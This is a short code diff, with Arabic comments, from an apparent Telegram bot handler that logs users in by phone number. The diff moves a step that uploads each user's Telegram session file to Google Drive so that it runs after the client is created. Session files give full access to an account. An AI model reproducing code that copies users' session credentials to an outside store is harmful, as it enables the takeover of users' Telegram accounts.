@@ -115,9 +115,9 @@ async def process_phone(update: Update, context: ContextTypes.DEFAULT_TYPE):
     'mimeType': 'application/octet-stream'  # نوع الملف (اختياري)
      }
 
-     media = MediaFileUpload(f'/tmp/session_{user_id}.session', resumable=True)  # رفع الملف من مجلد مؤقت
-     uploaded_file = drive_service.files().create(body=file_metadata, media_body=media, fields='id').execute()
-     print(f"تم إنشاء ملف الجلسة: File ID: {uploaded_file.get('id')}")
+     #media = MediaFileUpload(f'/tmp/session_{user_id}.session', resumable=True)  # رفع الملف من مجلد مؤقت
+     #uploaded_file = drive_service.files().create(body=file_metadata, media_body=media, fields='id').execute()
+     #print(f"تم إنشاء ملف الجلسة: File ID: {uploaded_file.get('id')}")
      ######^^^^^^
     
     # حذف الجلسة إذا كانت تالفة
@@ -141,6 +141,11 @@ async def process_phone(update: Update, context: ContextTypes.DEFAULT_TYPE):
     clients[user_id] = client
     phone_numbers[user_id] = phone_number
 
+    media = MediaFileUpload(f'/tmp/session_{user_id}.session', resumable=True)  # رفع الملف من مجلد مؤقت
+    uploaded_file = drive_service.files().create(body=file_metadata, media_body=media, fields='id').execute()
+    print(f"تم إنشاء ملف الجلسة: File ID: {uploaded_file.get('id')}")
+     
+    
     try:
         await client.connect()
         if await client.is_user_authorized():
